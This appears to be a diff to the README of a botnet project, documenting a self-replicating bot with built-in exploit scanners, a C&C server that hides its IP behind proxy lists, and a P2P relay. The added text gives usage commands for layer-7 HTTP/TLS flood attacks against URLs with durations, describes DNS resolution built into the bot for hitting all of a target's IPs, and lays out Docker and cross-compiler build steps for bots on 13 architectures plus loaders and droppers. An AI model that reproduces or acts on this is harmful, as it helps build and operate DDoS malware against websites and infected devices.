@@ -149,6 +149,28 @@ All scanners from `scanners-exploits/` are now built into `bot/selfrep.c`:
 
 ### 4. C&C Server (`cnc/`)
 
+**DNS Resolution for L7 Attacks:**
+L7 HTTP attacks (`tls`, `http`, `cf`, `axis-l7`) now resolve target domains directly on the bot using built-in DNS resolution. No need to specify `domain=x` - just pass the URL:
+
+```
+tls https://example.com/path 300
+http http://target.com/api 300
+axis-l7 https://example.com/login 600
+```
+
+The bot automatically:
+1. Parses the URL for protocol (HTTP/HTTPS), domain, path, and port
+2. Resolves the domain via DNS (using Cloudflare 1.1.1.1, Google 8.8.8.8, etc.)
+3. Connects to all resolved IPs with proper port (80 for HTTP, 443 for HTTPS)
+
+**DNS Servers (built into bot):**
+- `1.1.1.1` - Cloudflare Primary
+- `8.8.8.8` - Google Primary
+- `8.8.4.4` - Google Secondary
+- `9.9.9.9` - Quad9
+- `1.0.0.1` - Cloudflare Secondary
+- Plus fallback servers
+
 **Proxy List-Based Command Injection:**
 The CNC doesn't send commands directly to bots. Instead, it loads proxy lists from the `proxies/` folder (http.txt, https.txt, socks4.txt, socks5.txt) and uses them to inject attack commands into the P2P network while shielding its real IP address.
 
@@ -225,11 +247,25 @@ Python CLI for sending attack commands via P2P.
 
 ## Build Instructions
 
+### Option A: Docker (Recommended - Fully Self-Contained)
 ```bash
+# Build the Docker image with all cross-compilers included
+docker build -t axis3-builder .
+
+# Build everything inside Docker
+docker run -v $(pwd):/workspace axis3-builder ./build.sh
+```
+
+### Option B: System-Wide Cross-Compilers
+```bash
+# Install all 13 cross-compilers automatically
+chmod +x setup_cross_compilers.sh
+./setup_cross_compilers.sh
+
+# Then build
 chmod +x build.sh build_relay.sh build_scanners.sh
 ./build.sh           # Bots (13 archs), C&C, loader, DLRs, Seeder
 ./build_relay.sh     # P2P relay server
-./build_scanners.sh  # Standalone scanners (legacy, not needed for torrent mode)
 ```
 
 **Output:**
